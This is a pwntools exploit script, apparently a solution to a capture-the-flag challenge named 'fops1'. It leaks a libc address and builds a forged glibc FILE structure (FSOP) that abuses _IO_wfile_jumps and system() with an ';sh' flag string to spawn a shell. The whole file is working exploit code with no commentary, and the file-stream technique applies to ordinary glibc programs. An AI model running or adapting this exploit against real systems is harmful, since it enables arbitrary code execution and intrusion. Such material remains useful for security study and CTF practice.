#!/usr/bin/env python3
from pwn import *
# context.log_level = 'debug'
context(arch='amd64', os='linux')
warnings.filterwarnings('ignore')
import sys
p = process("./fops1_patched")
#p = remote("0.cloud.chals.io", 27987)
e = ELF("./fops1_patched",checksec=False)
l = ELF('./libc.so.6', checksec=False)
# l = ELF('./libc_prob.so.6', checksec=False)
s = lambda str: p.send(str)
sl = lambda str: p.sendline(str)
sa = lambda delims, str: p.sendafter(delims, str)
sla = lambda delims, str: p.sendlineafter(delims, str)
r = lambda numb=4096: p.recv(numb)
rl = lambda: p.recvline()
ru = lambda delims: p.recvuntil(delims)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
li = lambda str, data: log.success(str + "========>" + hex(data))
ip = lambda: input()
pi = lambda: p.interactive()

p.recvuntil(b'instruction ')

bss_start = int(p.recvline().strip(), 0x10)
info(f"bss_start: {(hex(bss_start))}")
l.address = bss_start - l.sym['_IO_2_1_stdout_']
success(f"libc_base: {(hex(l.address))}")
def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP
stdout_lock = l.sym.__nptl_last_event - 0x48 # gdb-peda$ info address _IO_stdfile_1_lock
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _wide_data=l.sym['_IO_2_1_stdout_'] - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(l.sym['_IO_2_1_stdout_'] - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
    _mode=0xFFFFFFFF,
)
info(f"FSOP payload len: {len(FSOP)}")    
p.sendline(bytes(FSOP))
pi()
